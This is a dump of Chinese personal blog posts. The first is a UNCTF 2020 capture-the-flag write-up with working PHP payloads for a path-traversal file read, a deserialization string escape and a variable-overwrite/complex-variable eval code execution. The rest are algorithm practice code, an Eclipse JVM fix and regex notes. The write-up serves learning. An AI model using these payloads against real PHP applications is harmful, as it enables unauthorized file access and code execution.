[{"title":"UNCTF","date":"2020-11-17T15:13:00.000Z","path":"2020/11/17/UNCTF/","text":"比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。 easy_ssrf&lt;?php echo'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'; highlight_file(__FILE__); $url = $_GET['url']; if(preg_match('/unctf\\.com/',$url))&#123; if(!preg_match('/php|file|zip|bzip|zlib|base|data/i',$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo('error!!'); &#125; &#125;else&#123; echo(\"error\"); &#125; ?&gt; 看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通 后来才知道考点根本不绕过。 payload： ?file=unctf.com/../../../../../flag //不唯一 ?file=():unctf.com/../../../../flag //()里可以填任意字符除了正则过滤的几个协议 原理：当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。 easyunserialize考察点是反序列化字符逃逸 先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。 &lt;?php function filter($str)&#123; return str_replace('bb', 'ccc', $str); &#125; class A&#123; public $name='aaaa'; public $pass='123456'; &#125; $AA=new A(); $res=filter(serialize($AA)); $c=unserialize($res); echo $c-&gt;pass; ?&gt; 利用反序列化逃逸修改pass的值。 正常的序列化结果 O:1:\"A\":2:&#123;s:4:\"name\";s:4:\"aaaa\";s:4:\"pass\";s:6:\"123456\";&#125; s:4:&quot;aaaa&quot;s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。 例如 O:1:\"A\":2:&#123;s:4:\"name\";s:5:\"aaaa\";s:4:\"pass\";s:6:\"123456\";&#125; 将4改为5，那么则认为name的值为 aaaa&quot;,此时因为前面的”无法闭合而导致反序列化失败。 而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。 例如想将pass变量的序列化字符串如下 \";s:4:\"pass\";s:6:\"hacker\";&#125; 其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志 上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸 &lt;?php function filter($str)&#123; return str_replace('bb', 'ccc', $str); &#125; class A&#123; public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";&#125;'; public $pass='123456'; &#125; $AA=new A(); var_dump(serialize($AA)); $res=filter(serialize($AA)); var_dump($res); $c=unserialize($res); echo $c-&gt;pass; //echo unserialize($AA); //\";s:4:\"pass\";s:6:\"hacker\";&#125; ?&gt; //结果如下 ||为对齐 /* string(136) \"O:1:\"A\":2:&#123;s:4:\"name\";s:81:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";&#125;\";s:4:\"pass\";s:6:\"123456\";&#125;\"|| string(163) \"O:1:\"A\":2:&#123;s:4:\"name\";s:81:\"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\";s:4:\"pass\";s:6:\"hacker\";&#125;\"||;s:4:\"pass\";s:6:\"123456\";&#125;\" hacker */ 这里pass的值就被该称了hacker 总结：逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。 参考 &lt;?php error_reporting(0); highlight_file(__FILE__); class a &#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password==='easy') &#123; include('flag.php'); echo $flag; &#125; else &#123; echo 'wrong password'; &#125; &#125; &#125; function filter($string)&#123; return str_replace('challenge','easychallenge',$string); &#125; $uname=$_GET[1]; $password=1; $ser=filter(serialize(new a($uname,$password))); $test=unserialize($ser); ?&gt; 这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是 需要构造的属性 \";s:4:\"password\";s:4:\"easy\";&#125; 可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。 \";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125; 上面构造出的payload长度为48因此还需要12个challenge。 &lt;?php class a &#123; public $uname='challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125;'; public $password=\"1\"; &#125; function filter($string)&#123; return str_replace('challenge','easychallenge',$string); &#125; $ser=filter(serialize(new a($uname,$password))); echo($ser); ?&gt; O:1:\"a\":2:&#123;s:5:\"uname\";s:156:\"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125;\";s:8:\"password\";s:1:\"1\";&#125; //easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge 长度为156 finalpayload： challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125; easyphp给了提示 /source查看源码 &lt;?php $adminPassword = 'd8b8caf4df69a81f2815pbcb74cd73ab'; if (!function_exists('fuxkSQL')) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace('\\\\\\\\', '\\\\', $oText); $oText = str_replace('\\\"', '\"', $oText); $oText = str_replace(\"\\'\", \"'\", $oText); $oText = str_replace(\"'\", \"''\", $oText); return $oText; &#125; &#125; if (!function_exists('getVars')) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists('mysql_real_escape_string')) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace('\"', '\\\"', str_replace(\"'\", \"\\'\", (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists('mysql_real_escape_string')) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace('\"', '\\\"', str_replace(\"'\", \"\\'\", (trim($value)))); &#125; &#125; &#125; &#125; &#125; &#125; getVars(); if (isset($source)) &#123; highlight_file(__FILE__); &#125; //只有admin才能设置环境变量 if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo 'you can set config variables!!' . '&lt;/br&gt;'; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(\"\\$$key\" . '=\"' . $GLOBALS[$key] . '\";'); &#125; &#125; &#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key)) &#123; echo ($GLOBALS[$key]) . '&lt;/br&gt;'; &#125; &#125; &#125; 代码很长，但是很容易理解 fuxkSQL是将可能存在sql注入的符号转义 getvarh是将传的参数赋值 global ${$key};这里存在两个$$，所以可能存在变量覆盖 if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) $password的md5值与adminPassword,这里可以利用变量覆盖绕过 password=111&amp;adminPassword=md(111) sha1($verif)==$verif弱类型比较，也很容易绕过 sha1($a)=0exxx 只要找出0e开头的字符串的sha1值为0e开头 &lt;?php for ($i5 = 0; $i5 &lt;= 9999999999; $i5++) &#123; $res = '0e' . $i5; //0e1290633704 if ($res == hash('sha1', $res)) &#123; print_r($res); &#125; &#125; 所以verif=0e1290633704 重点在这 foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(\"\\$$key\" . '=\"' . $GLOBALS[$key] . '\";'); &#125; &#125; 这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的 由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell 什么是php复杂变量getshell PHP复杂变量 {}不能被转移，其包裹的部分可当作变量就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符 payload: ?source=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;password=1&amp;verif=0e1290633704&amp;var1=&#123;$_GET[1]&#125;&amp;var3=$&#123;$var1()&#125;&amp;1=phpinfo //var1=&#123;phpinfo&#125; //var3=$&#123;$var1&#125;=$&#123;phpinfo&#125; flag藏在phpinfo中，ctrl+f搜素flag即可","tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://sunzhengyu99.github.io/tags/ssrf/"}]},{"title":"算法上机复习","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/算法上机复习/","text":"最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了) 16级题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入3 3 4 50 样例输出3 5 20365011074 提示注意结果超过int范围，请用long long类型存储ans #include&lt;bits/stdc++.h&gt; using namespace std; const int N=50; long long f[N]; int main() &#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入3 7 143 3223193224 样例输出10 151 163311433223 提示测试数据均大于等于1，不用特判0 感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。 #include&lt;bits/stdc++.h&gt; using namespace std; int t,m; void convert(int n) &#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n; &#125; int main() &#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; 问题 C: 圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入6 1 2 3 45 81 样例输出1 2 4 57 121 提示这题就是汽水瓶的改编。。。 #include&lt;bits/stdc++.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0; &#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入2 10 4 3 5 2 4 20 9 3 5 2 4 6 1 8 5 9 样例输出3 6 提示就是简单的装在问题 #include&lt;bits/stdc++.h&gt; using namespace std; int T,m,n; int w[1005]; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1 10 5 2 6 2 3 6 5 5 4 4 6 样例输出15 提示01背包问题，不知道下面的解能不能过 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=1e5+5; long long ans[N]; int w[N],v[N]; int T; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125; // for(int i=0;i&lt;=C;i++) // cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0; &#125; ps:以上代码没有提交测试环境，只是过了给出的测试样例。 dfs大合集迷宫问题题目描述小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---## 样例输出9 #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,int&gt; P; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='T') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125; acwing迷宫问题#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int dis[N][N]; typedef pair&lt;int,int&gt; P; int n,m; int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; int x,y,nx,ny; void dfs() &#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0; &#125; n皇后问题#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans=0; const int N=20; char m[N][N]; bool col[N],dg[N],udg[N]; void dfs(int u) &#123; if(u==n) &#123; // for(int i=0;i&lt;n;i++) // cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]='Q'; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//回溯恢复现场 m[u][i]='.'; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]='.'; dfs(0); cout&lt;&lt;ans; return 0; &#125; m图着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 样例输出48 提示#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int color[N]=&#123;0&#125;; int n,k,m,ans=0; void dfs(int d) &#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 部分和题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入4 1 2 4 7 13 样例输出Yes #include&lt;bits/stdc++.h&gt; using namespace std; int s[25]; int n,m; bool check(int l,int a) &#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;\"YES\"; else cout&lt;&lt;\"NO\"; return 0; &#125;","tags":[]},{"title":"google搜索引擎&eclipse启动问题","date":"2020-11-02T08:37:34.000Z","path":"2020/11/02/eclipse启动问题/","text":"谷歌搜索引擎前两天突然无法搜索东西但是可以继续访问YouTube，就**离谱。 由于课程原因需要学习java，今天就下载了一个Java常用的编辑器eclipse，但是启动时给我一个弹窗，版本不一致。 google浏览器问题Google浏览器可以访问外网，但是无法使用搜索引擎搜东西，每次显示无法连接www.google.com 解决一开始想着卸载重装，发现还是不行，后来换成了测试版本结果真能用，但是两天没到又出现那种情况，很无语 想着应该是google.com被屏蔽了，试着清除dns缓存 ipconfig /flushdns 还是不行，直接释放ip重新申请 ipconfig /release ipconfig /renew 然后就可以用了。。 （几个小时过去了就他妈不能用了，真尼玛离谱） eclipse问题问题弹窗内容 Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required. JVM的1.8.0_271版本不适合此产品。版本：11或更高版本是必需的。 大概意思就是当前的jvm版本与软件不相容 解决方法1.找到java安装的路径默认安装是下面这个路径 C:\\Program Files\\Java\\ 找到 C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe 2.打开eclipse的安装路径，打开eclipse.ini修改成下面这样 -startup plugins/org.eclipse.equinox.launcher_1.5.800.v20200727-1323.jar --launcher.library plugins/org.eclipse.equinox.launcher.win32.win32.x86_64_1.1.1300.v20200819-0940 -product org.eclipse.epp.package.java.product -showsplash org.eclipse.epp.package.common --launcher.defaultAction openFile --launcher.defaultAction openFile --launcher.appendVmargs -vm //这两行 C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe //是添加的 -vmargs -Dosgi.requiredJavaVersion=1.8 //这里改为jdk版本号 -Dosgi.instance.area.default=@user.home/eclipse-workspace -XX:+UseG1GC -XX:+UseStringDeduplication --add-modules=ALL-SYSTEM -Dosgi.requiredJavaVersion=1.8 //这里也一样 -Dosgi.dataAreaRequiresExplicitInit=true -Xms256m -Xmx2048m --add-modules=ALL-SYSTEM 保存后成功启动。","tags":[]},{"title":"正则表达式","date":"2020-11-01T13:31:31.000Z","path":"2020/11/01/preg/","text":"在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！ 什么是正则表达式详情见这 菜鸡教程中介绍的很详细。 特殊字符许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 \\$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \\*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \\+。 . 匹配除换行符 \\n 之外的任何单字符。要匹配 . ，请使用 \\. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用\\[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\\n’ 匹配换行符。序列 ‘\\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 \\{。 | 指明两项之间的一个选择。要匹配 |，请使用 \\ 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 常用的正则表达式及含义参考 一、校验数字的表达式 1. 数字：^[0-9]*$ // ^表示字符的开始，$表示结束 [0-9] 表示字符串中的字符在0-9中 2. n位的数字：^\\d&#123;n&#125;$ // \\d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数 3. 至少n位的数字：^\\d&#123;n,&#125;$ //&#123;n,&#125;至少n次 4. m-n位的数字：^\\d&#123;m,n&#125;$ //&#123;n,m&#125; n-m次 5. 零和非零开头的数字：^(0|[1-9][0-9]*)$ // | 是或者意思，表示匹配左右两个子表达式其中一个都可以 6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ // +匹配前面的表达式一次或多次 (.[0-9]&#123;1,2&#125;)? 表示匹配 (.[0-9]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[1-9]或者0.[0-9][1-9] 7. 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d&#123;1,2&#125;)?$ // (\\-)? 匹配一次或零次负号 8. 正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$ // \\- \\+ \\.是将特殊字符转义 9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$ 10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$ 11. 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\\+?[1-9][0-9]*$ // [1-9] 控制非零 12. 非零的负整数：^\\-[1-9][]0-9\"*$ 或 ^-[1-9]\\d*$ //一下的表达式的含义可以以此类推（感觉不是很常用） 